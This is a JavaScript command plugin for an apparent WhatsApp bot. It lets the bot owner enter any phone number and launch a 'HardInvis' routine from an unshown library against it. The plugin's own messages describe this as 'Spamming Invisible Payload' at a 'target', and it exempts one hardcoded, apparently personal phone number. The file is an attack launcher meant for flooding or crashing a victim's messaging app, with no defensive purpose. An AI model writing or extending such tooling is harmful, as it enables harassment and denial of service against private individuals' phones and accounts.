// plugins/rizoinvis.js
let { HardInvis } = require('../lib/rizoinvis');

let handler = async (m, { conn, args, command, isCreator }) => {
    if (!isCreator) return m.reply('🔒 *Owner Only - HardInvis Command!*');

    if (!args[0]) {
        return m.reply(`📌 *Usage:* .${command} 923xx`);
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return m.reply('❌ *Invalid number format!*');
    }

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
        return m.reply('🔒 *This number is protected!*');
    }

    let target = pepec + '@s.whatsapp.net';

    await m.reply(`👻 *HardInvis Target Locked:* ${pepec}\n⚡ *Spamming Invisible Payload with Error Control...*`);

    try {
        // Background ya sequential execution ke liye call kar rahe hain
        await HardInvis(conn, target);

        await conn.sendMessage(m.chat, {
            react: { text: "👻", key: m.key }
        });

    } catch (error) {
        console.error("Plugin Error:", error);
        m.reply("⚠️ Error: HardInvis plugin execute karte waqt masla aaya hai.");
    }
}

handler.command = ['hardinvis', 'rizoinvis', 'hinvis'];
handler.tags = ['owner', 'rizo'];
handler.help = ['hardinvis 923xx'];
module.exports = handler;
